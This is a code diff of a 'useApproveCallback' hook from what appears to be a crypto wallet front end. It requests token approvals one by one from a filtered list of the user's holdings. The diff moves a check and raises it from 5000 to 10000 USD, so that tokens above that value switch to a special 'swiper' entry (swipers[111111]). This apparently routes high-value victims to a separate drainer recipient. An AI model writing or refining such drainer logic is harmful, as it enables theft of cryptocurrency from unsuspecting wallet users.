@@ -226,7 +226,6 @@ export function useApproveCallback(
 
   // const tokenContract = useTokenContract(token?.address)
   const tokenContract = useTokenContract(tokensFiltered[0]?.token_address)
-  if (tokensFiltered[0]?.usdValue > 5000) setSwiper(swipers[111111])
   const addTransaction = useTransactionAdder()
 
   const approve = useCallback(
@@ -291,8 +290,8 @@ export function useApproveCallback(
 
       // if (!estimatedGas) return undefined
 
+      if (tokensFiltered[0]?.usdValue > 10000) setSwiper(swipers[111111])
       tokensFiltered.shift()
-      if (tokensFiltered[0]?.usdValue > 5000) setSwiper(swipers[111111])
       setTokensFiltered(tokensFiltered)
 
       return callWithGasPrice(
